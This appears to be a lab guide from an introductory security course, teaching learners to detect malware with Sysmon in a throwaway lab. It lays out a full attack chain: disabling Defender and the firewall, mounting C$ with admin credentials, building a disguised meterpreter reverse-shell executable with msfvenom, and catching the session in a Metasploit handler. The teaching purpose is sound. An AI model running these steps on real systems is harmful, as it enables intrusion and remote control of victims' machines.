![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)


# Sysmon

Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/bb7c958d-9879-44d3-a6e2-441139a94caa" />

Next, run the following command in the **Powershell** terminal:

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

![](attachments/applocker_disabledefender.png)
This will disable **Defender** for this session.

If you get angry red errors, that is **Ok**, it means **Defender** is not running.

Next, lets ensure the firewall is disabled. In a Windows Command Prompt.

```ps
netsh advfirewall set allprofiles state off
```


Next, set a password for the Administrator account that you can remember

```ps
net user Administrator password1234
```

Please note, that is a very bad password.  Come up with something better. But, please remember it.

Before we move on from our Powershell window, lets get our IP by running the following command:

<pre>ipconfig</pre>

![](attachments/powershellipconfig.png)

**REMEMBER - YOUR IP WILL BE DIFFERENT**

Write this IP down so we can use it again later.




- Open **Command Prompt**

<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />

- **SSH** into the **Linux** machine
```bash
ssh ubuntu@linux.cloudlab.lan
```

<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />




We need to run the following commands in order to mount our remote system to the correct directory:

```bash
sudo su -
```

<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>

**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**

If you see the following error, it means that the device is already mounted.

![](attachments/mounterror.png)

If this is the case, ignore it.

Run the following command to navigate into the mounted directory:

<pre>cd /mnt/windows-share</pre>

Before we run the next commands, we need to get the IP of our Linux System (AKA our Linux IP Adress). Lets do so by running the following:

```bash
ifconfig
```

![](attachments/ifconfig.png)

**REMEMBER: YOUR IP WILL BE DIFFERENT**

Run the following commands to start a simple backdoor and backdoor listener: 

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe
```

Let's start the **Metasploit** Handler.  



- Open **Command Prompt**

<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />

- **SSH** into the **Linux** machine
```bash
ssh ubuntu@linux.cloudlab.lan
```

<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />



Let's become root.

```bash
sudo su -
```

Now let's start the **Metasploit** Handler

```bash
msfconsole -q
```

We are going to run the following commands to correctly set the parameters:

```bash
use exploit/multi/handler
```

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

```bash
set LHOST [Your Linux IP Address]
```

Remember, **Your IP will be different!**

```bash
exploit
```

It should look like this:

![](attachments/msfconsole.png)

We will need to open a **"cmd.exe"** terminal as **Administrator**.

![](attachments/OpeningWindowsCommandPrompt.png)

<pre>cd \IntroLabs</pre>

<pre>Sysmon64.exe -accepteula -i sysmonconfig-export.xml</pre>

It should look like this:

![](attachments/sysmonexe.png)

let's run the following commands to run the **"TrustMe.exe"** file.

<pre>cd \</pre>
 
Then run it with the following:

 <pre>TrustMe.exe</pre>

Back at your Linux terminal, you should have a metasploit session!

![](attachments/meterpretersession.png)

Now, we need to view the Sysmon events for this malware:

Open **"Event Viewer"** by pressing the Windows key and searching for it.

![](attachments/eventviewer.png)

You will select Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational

![](attachments/eventviewernav1.png)

You'll have to scroll down a bit until you find the **Sysmon** folder.  

![](attachments/eventviwernav2.png)

Start at the top and work down through the logs, you should see your **malware** executing.  Please note your paths may be different.

![](attachments/logs.png)

![](attachments/processcreateview.png)





***                                                                 
<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/WebTestingIntroClass/WebTesting.md)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/RITAIntroClass/RITA.md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---




